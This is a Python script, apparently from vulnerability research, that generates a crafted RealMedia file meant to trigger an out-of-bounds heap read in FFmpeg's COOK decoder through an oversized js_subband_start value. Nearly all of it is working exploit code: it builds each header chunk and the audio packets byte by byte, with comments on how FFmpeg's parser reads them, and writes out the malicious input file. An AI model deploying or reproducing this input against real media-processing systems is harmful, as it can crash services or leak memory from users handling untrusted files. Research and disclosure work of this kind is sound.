#!/usr/bin/env python3
"""
PoC generator for COOK OOB heap read via js_subband_start.
CVE candidate: joint_decode() in libavcodec/cook.c lines 851-855.

Constructs a minimal .rm (RealMedia) file with a COOK joint-stereo stream
where js_subband_start=50. When FFmpeg decodes this, joint_decode() loops
  for (i = 0; i < p->js_subband_start; i++)  [i goes 0..49]
and accesses decode_buffer[i * 40 + 20 + j] (j in 0..19).
Max index = 49*40 + 20 + 19 = 1999, which exceeds the allocated buffer.
"""

import struct
import sys
import os

def be16(v): return struct.pack('>H', v & 0xFFFF)
def be32(v): return struct.pack('>I', v & 0xFFFFFFFF)
def u8(v):   return bytes([v & 0xFF])

# ---------------------------------------------------------------------------
# COOK extradata (16 bytes)
# Parsed by cook_decode_init() via bytestream2_get_be* calls:
#   cookversion (BE32)
#   samples_per_frame (BE16)
#   subbands (BE16)
#   unknown/unused (BE32)  <-- skipped with bytestream2_get_be32
#   js_subband_start (BE16)
#   js_vlc_bits (BE16)
# ---------------------------------------------------------------------------
JOINT_STEREO     = 0x1000003
samples_per_frame = 1024   # samples_per_channel = 1024/2 = 512 (valid)
subbands          = 3      # total_subbands = 3 + 50 = 53 (max allowed)
js_subband_start  = 50     # just below the 51 limit; triggers OOB in joint_decode
js_vlc_bits       = 6      # must be 2..6

cook_extra = (
    be32(JOINT_STEREO)
    + be16(samples_per_frame)
    + be16(subbands)
    + be32(0)              # unknown, consumed but unused
    + be16(js_subband_start)
    + be16(js_vlc_bits)
)
assert len(cook_extra) == 16

# ---------------------------------------------------------------------------
# RA version-5 header (embedded inside MDPR codec_data after the .ra\xfd tag)
# Parsed by rm_read_audio_stream_info() in libavformat/rmdec.c.
#
# Field layout for version==5 (offsets are from start of ra_header bytes,
# i.e., AFTER the 4-byte .ra\xfd tag):
#   BE16  version          = 5
#   2     unused skip
#   BE32  .ra4 marker      (not checked, just consumed)
#   BE32  data_size        (not checked)
#   BE16  version2         = 5
#   BE32  header_size      (not checked)
#   BE16  flavor           = 0
#   BE32  coded_framesize  = sub_packet_size (512)
#   BE32  ???              = 0
#   BE32  bytes_per_minute = 0
#   BE32  ???              = 0
#   BE16  sub_packet_h     = 2  (interleave height)
#   BE16  frame_size       = 1024  -> audio_framesize
#   BE16  sub_packet_size  = 512   -> decoder's block_align
#   BE16  ???              = 0
#   [version==5] BE16*3 extra fields = 0,0,0
#   BE16  sample_rate      = 44100
#   BE32  unknown          = 0
#   BE16  nb_channels      = 2
#   [version==5] LE32 deint_id = 'genr'
#   [version==5] 4 bytes fourcc = 'cook'
#   [COOK] BE16 unknown    = 0
#   [COOK] u8  unknown     = 0
#   [version==5] u8        = 0  (extra skip for v5)
#   BE32  codecdata_length = 16
#   <cook_extra bytes>
# ---------------------------------------------------------------------------
sub_packet_h    = 2     # interleave height; need 2 packets to fill buffer
frame_size      = 1024  # audio_framesize (must be divisible by sub_packet_size)
sub_packet_size = 512   # becomes decoder block_align; frame_size % sub_packet_size == 0
sample_rate     = 44100
nb_channels     = 2

# DEINT_ID_GENR = MKTAG('g','e','n','r') = read by avio_rl32 → little-endian
deint_id_bytes = b'genr'
fourcc_bytes   = b'cook'  # read by ffio_read_size as raw bytes

ra_header = (
    be16(5)                # version = 5
    + b'\x00\x00'          # unused (skipped)
    + b'.ra4'              # .ra4 marker (consumed but not checked)
    + be32(0)              # data_size (consumed but not checked)
    + be16(5)              # version2
    + be32(0x4e)           # header_size (not checked)
    + be16(0)              # flavor
    + be32(sub_packet_size)# coded_framesize
    + be32(0)              # ???
    + be32(0)              # bytes_per_minute
    + be32(0)              # ???
    + be16(sub_packet_h)   # sub_packet_h
    + be16(frame_size)     # frame_size -> audio_framesize
    + be16(sub_packet_size)# sub_packet_size -> decoder block_align
    + be16(0)              # ???
    + be16(0) + be16(0) + be16(0)  # version==5: three extra BE16s
    + be16(sample_rate)    # sample_rate
    + be32(0)              # unknown
    + be16(nb_channels)    # nb_channels = 2
    + deint_id_bytes       # deint_id (LE32): 'genr'
    + fourcc_bytes         # fourcc 'cook' (4 bytes raw read)
    # COOK-specific pre-extradata fields:
    + be16(0)              # unknown (avio_rb16)
    + u8(0)                # unknown (avio_r8)
    + u8(0)                # version==5 extra byte (avio_r8)
    + be32(len(cook_extra))# codecdata_length
    + cook_extra           # actual COOK extradata
)

# Full codec_data block in MDPR type_specific_data:
# Starts with .ra\xfd (the tag checked by ff_rm_read_mdpr_codecdata).
# avio_rb32 at that point must equal MKTAG(0xfd,'a','r','.') = 0x2e7261fd.
# Since avio_rb32 is big-endian: bytes in file = 0x2e, 0x72, 0x61, 0xfd = ".ra\xfd"
codec_data = b'.ra\xfd' + ra_header

# ---------------------------------------------------------------------------
# MDPR chunk body (after 10-byte chunk header: 4-byte tag + 4-byte size + 2-byte ver)
# ---------------------------------------------------------------------------
stream_name = b''
mime_type   = b'audio/x-pn-realaudio'

mdpr_body = (
    be16(0)                     # stream_id
    + be32(0)                   # max_bit_rate
    + be32(0)                   # avg_bit_rate
    + be32(frame_size)          # max_packet_size
    + be32(frame_size)          # avg_packet_size
    + be32(0)                   # start_time
    + be32(0)                   # preroll
    + be32(10000)               # duration (ms)
    + u8(len(stream_name)) + stream_name
    + u8(len(mime_type))   + mime_type
    + be32(len(codec_data))
    + codec_data
)

def make_chunk(tag, ver, body):
    """Build an RMFF chunk: tag(4) + total_size(4BE) + ver(2BE) + body."""
    size = 4 + 4 + 2 + len(body)
    return tag + be32(size) + be16(ver) + body

# ---------------------------------------------------------------------------
# RMF header chunk
# After reading tag + tag_size, ffmpeg does: avio_skip(pb, tag_size - 8)
# So we need tag_size >= 8 and put any padding after.
# ---------------------------------------------------------------------------
rmf_body = b'\x00' * 10  # object_version(2) + file_version(4) + num_headers(4)
rmf_chunk = b'.RMF' + be32(4 + 4 + len(rmf_body)) + rmf_body  # no ver field here
# Note: RMF doesn't have a 'ver' field in the normal sense; its tag_size covers
# everything including any padding. We just need tag_size-8 bytes to skip.

# ---------------------------------------------------------------------------
# PROP chunk body
# Fields: max_bit_rate, avg_bit_rate, max_packet_size, avg_packet_size,
#         nb_packets, duration, preroll, indx_off(BE32 for ver==0), data_off,
#         nb_streams, flags
# ---------------------------------------------------------------------------
prop_body = (
    be32(0)   # max_bit_rate
    + be32(0) # avg_bit_rate
    + be32(frame_size) # max_packet_size
    + be32(frame_size) # avg_packet_size
    + be32(2) # nb_packets (2 audio packets)
    + be32(10000) # duration (ms)
    + be32(0) # preroll
    + be32(0) # indx_off (0 = no index)
    + be32(0) # data_off (0 = auto-computed by ffmpeg)
    + be16(1) # nb_streams
    + be16(0) # flags
)
prop_chunk = make_chunk(b'PROP', 0, prop_body)

# ---------------------------------------------------------------------------
# MDPR chunk
# ---------------------------------------------------------------------------
mdpr_chunk = make_chunk(b'MDPR', 0, mdpr_body)

# ---------------------------------------------------------------------------
# CONT chunk (content description)
# rm_read_metadata(s, pb, wide=1) reads 4 x BE16 lengths (all 0 here).
# ---------------------------------------------------------------------------
cont_body = be16(0) + be16(0) + be16(0) + be16(0)  # title/author/copyright/comment = empty
cont_chunk = make_chunk(b'CONT', 0, cont_body)

# ---------------------------------------------------------------------------
# DATA chunk header
# After tag+size+ver, ffmpeg reads:
#   nb_packets (BE32)
#   [ver==2: skip 12]
#   next_data_header (BE32)
# ---------------------------------------------------------------------------
data_body = (
    be32(2)  # nb_packets = 2
    + be32(0)  # next_data_header = 0 (no chained DATA)
)
# DATA chunk is special: tag_size check is exempted (can be < 10).
data_header = b'DATA' + be32(4 + 4 + 2 + len(data_body)) + be16(0) + data_body

# ---------------------------------------------------------------------------
# Audio data packets
#
# rm_sync() accumulates bytes into uint32 'state'. A valid packet is
# detected when 12 < state <= 0xFFFF. The state bytes are NOT in a
# separate field; they emerge from the byte-by-byte accumulation.
#
# For total chunk size S = 12 + data_len, the bytes that produce state==S
# from state==0xFFFFFFFF are (tracing the shift-and-add):
#
#   byte1=0x00 → state = 0xFFFFFF00 (> 0xFFFF, skip)
#   byte2=0x00 → state = 0xFFFF0000 (> 0xFFFF, skip)
#   byte3=hi8  → state = 0xFF00_0000 | hi8*256 (> 0xFFFF, skip)
#   byte4=lo8  → state = (hi8<<8)|lo8 = S  (if S ≤ 0xFFFF and > 12)
#
# So emit S as [0x00, 0x00, S>>8, S&0xFF], then 8 bytes of packet meta.
#
# Each GENR packet carries frame_size=1024 bytes of audio payload.
# Two packets fill the h*w = 2*1024 = 2048 byte interleave buffer.
# ---------------------------------------------------------------------------
audio_payload = b'\x00' * frame_size  # 1024 bytes of null audio

def make_audio_packet(stream_id, timestamp, flags, payload):
    data_len = len(payload)
    total = 12 + data_len  # must be 13..65535
    assert 13 <= total <= 65535, f"chunk size {total} out of range"
    # 4-byte state encoding:
    state_bytes = bytes([0x00, 0x00, (total >> 8) & 0xFF, total & 0xFF])
    meta = (
        be16(stream_id)  # num
        + be32(timestamp) # timestamp
        + u8(0x00)        # mlti_byte: (0>>1)-1 = -1 → FFMAX(-1,0)=0, mlti_id=0
        + u8(flags)       # flags: 0x02 = keyframe
    )
    return state_bytes + meta + payload

pkt1 = make_audio_packet(0, 0,     0x02, audio_payload)  # keyframe → resets sub_packet_cnt
pkt2 = make_audio_packet(0, 1000,  0x00, audio_payload)  # second interleave packet

# ---------------------------------------------------------------------------
# Assemble full .rm file
# ---------------------------------------------------------------------------
rm_file = rmf_chunk + prop_chunk + mdpr_chunk + cont_chunk + data_header + pkt1 + pkt2

# ---------------------------------------------------------------------------
# Write output
# ---------------------------------------------------------------------------
out_dir = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, 'vuln_001_input.rm')
with open(out_path, 'wb') as f:
    f.write(rm_file)

print(f"[+] Written {len(rm_file)} bytes to {out_path}")
print(f"    cook_extra length    : {len(cook_extra)}")
print(f"    ra_header length     : {len(ra_header)}")
print(f"    codec_data length    : {len(codec_data)}")
print(f"    js_subband_start     : {js_subband_start} (OOB trigger)")
print(f"    subbands             : {subbands}")
print(f"    total_subbands       : {subbands + js_subband_start} (≤ 53 limit)")
print(f"    samples_per_channel  : {samples_per_frame // nb_channels} (must be 256/512/1024)")
